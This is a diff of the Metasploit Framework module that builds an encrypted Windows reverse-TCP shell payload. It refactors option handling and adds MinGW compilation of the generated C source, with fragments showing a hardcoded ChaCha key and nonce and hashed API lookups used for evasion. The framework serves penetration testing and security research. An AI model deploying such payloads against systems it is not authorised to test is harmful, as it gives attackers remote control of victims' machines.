@@ -1,6 +1,8 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/windows/encrypted_payload_opts'
+require 'metasploit/framework/compiler/mingw'
 
 module Msf
 
@@ -13,26 +15,17 @@ module Payload::Windows::EncryptedReverseTcp
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
+  include Msf::Payload::Windows::EncryptedReverseTcpOpts
 
   def initialize(*args)
     super
-
-    register_options(
-    [
-      OptBool.new('CallWSAStartup', [ false, 'Adds the function that initializes the Winsock library', true ])
-    ])
-
-    register_advanced_options(
-    [
-      OptBool.new('StripSymbols', [ false, 'Payload will be compiled without symbols', true ]),
-    ])
   end
 
   def generate(opts={})
     conf =
     {
       call_wsastartup: datastore['CallWSAStartup'],
-      port:            format_ds_opt(datastore['LPORT']).to_i,
+      port:            format_ds_opt(datastore['LPORT']),
       host:            format_ds_opt(datastore['LHOST']) || ''
     }
 
@@ -40,7 +33,13 @@ module Payload::Windows::EncryptedReverseTcp
     # then compilation and removal of null bytes
     src = generate_c_src(conf)
 
-    compile_opts = { strip_symbols: datastore['StripSymbols'] }
+    compile_opts =
+    {
+      strip_symbols: datastore['StripSymbols'],
+      arch:          self.arch_to_s
+    }
+
+    Metasploit::Framework::Compiler::Mingw.compile_c(src, compile_opts)
     src
   end
 
@@ -82,7 +81,6 @@ module Payload::Windows::EncryptedReverseTcp
       #include "kernel32_util.h"
 
       #include "chacha.h"
-
     ^
   end
 
@@ -90,7 +88,6 @@ module Payload::Windows::EncryptedReverseTcp
     %Q^
       #define KEY     "HKa1Rt3KdxCf35I3kS1RUGh6MXSfqEC4"
       #define NONCE   "bCsEzT3QbCsE"
-
     ^
   end
 
@@ -332,7 +329,6 @@ module Payload::Windows::EncryptedReverseTcp
         CloseHandle(*(comm_handles + 1));
         WSACleanup = (FuncWSACleanup) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSACleanup')}); // hash('ws2_32.dll', 'WSACleanup') -> 0xf44a6e2b
       }
-
     ^
   end
 end
